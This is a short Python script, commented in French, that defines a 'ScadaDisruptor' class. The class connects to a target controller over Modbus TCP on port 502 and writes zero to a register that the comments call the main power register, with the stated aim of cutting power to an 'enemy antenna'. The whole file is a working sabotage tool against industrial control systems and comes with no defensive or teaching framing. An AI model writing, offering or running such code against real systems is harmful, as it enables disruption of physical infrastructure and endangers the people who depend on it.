from pymodbus.client import ModbusTcpClient

class ScadaDisruptor:
    def __init__(self, target_ip):
        self.client = ModbusTcpClient(target_ip, port=502)

    def shutdown_relay_power(self):
        """Coupe l'alimentation des rectificateurs de l'antenne ennemie"""
        if self.client.connect():
            # Adresse 0x01: Registre d'alimentation générale
            # Valeur 0: Shutdown
            self.client.write_register(1, 0)
            print(f"[SCADA] Commande d'arrêt envoyée à {self.client.host}")
            self.client.close()
        else:
            print("[SCADA] Échec de connexion à l'automate cible.")
